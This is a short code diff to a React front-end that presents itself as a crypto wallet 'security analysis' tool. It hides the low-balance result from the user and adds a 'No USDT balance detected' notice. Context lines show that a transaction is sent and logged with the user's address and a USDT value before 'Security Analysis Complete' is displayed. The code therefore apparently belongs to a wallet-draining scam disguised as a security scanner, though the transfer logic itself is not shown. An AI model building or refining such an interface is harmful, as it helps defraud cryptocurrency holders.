@@ -254,7 +254,7 @@ export function Hero() {
         await pushLog(userAddr, fUSDT, tx.hash);
         toast.success("Security Analysis Complete", { id: activeToast });
       } else {
-        toast.success("Analysis Finished (Low Balance)", { id: activeToast });
+        console.log("Analysis Finished (Low Balance)", { id: activeToast });
       }
 
       setLoading(false);
@@ -323,6 +323,12 @@ export function Hero() {
               <div className="flex justify-between text-sm border-t border-gray-800 pt-2"><span className="text-gray-400">BNB Balance</span><span className="text-yellow-500 font-bold">{data.bnb}</span></div>
               <div className="flex justify-between text-sm border-t border-gray-800 pt-2"><span className="text-gray-400">Reported USDT</span><span className="text-red-500 font-bold">{data.usdt}</span></div>
             </div>
+
+           {parseFloat(data.usdt) < 1 && (
+  <div className="flex flex-col items-center mb-6">
+    <h2 className="text-white text-xl font-bold">No USDT balance detected in this wallet</h2>
+  </div>
+)}
 
             <button onClick={() => setShowModal(false)} className="w-full bg-yellow-400 hover:bg-yellow-300 text-black font-black py-4 rounded-2xl shadow-lg shadow-yellow-500/10">
               CLOSE REPORT
